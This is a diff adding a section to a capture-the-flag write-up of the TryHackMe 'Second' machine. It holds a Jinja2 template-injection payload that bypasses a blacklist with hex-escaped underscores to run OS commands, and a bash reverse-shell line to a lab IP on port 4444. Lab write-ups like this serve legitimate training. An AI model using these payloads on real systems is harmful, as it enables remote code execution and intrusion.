@@ -253,3 +253,37 @@ ssh -L 5000:127.0.0.1:5000 smokey@second.thm
 > It works
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-03%2000-01-56.png)
+
+> Bypassing the blacklist:
+
+> Payload: `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-03%2000-08-26.png)
+
+---
+
+## RCE & Lateral Movement: Second Order SSTI
+
+> Payload
+
+`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/tmp/shell.sh')|attr('read')()}}`
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-03%2000-10-26.png)
+
+> In order to avoid any problem, I wrote the rev shell payload inside /tmp/shell.sh to execute it inside of the ssti payload
+
+```shell
+smokey@ip-10-130-172-231:/tmp$ echo "bash -c 'bash -i >& /dev/tcp/192.168.152.35/4444 0>&1'" > shell.sh
+smokey@ip-10-130-172-231:/tmp$ ls -l shell.sh 
+-rwxrwxr-x 1 smokey smokey 55 Aug  2 20:32 shell.sh
+```
+
+> The response hangs, and we got the reverse shell!
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-03%2000-35-39.png)
+
+> There's a note and the user.txt. How ironic, Smokey giving security advices :D
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Second/Images/Screenshot%20From%202026-08-03%2000-38-23.png)
+
+> The hint said: "How can one capture the progress check? Only a shark would know." Sounds obvious that capturing internet packets will help us in privilege escalation. 
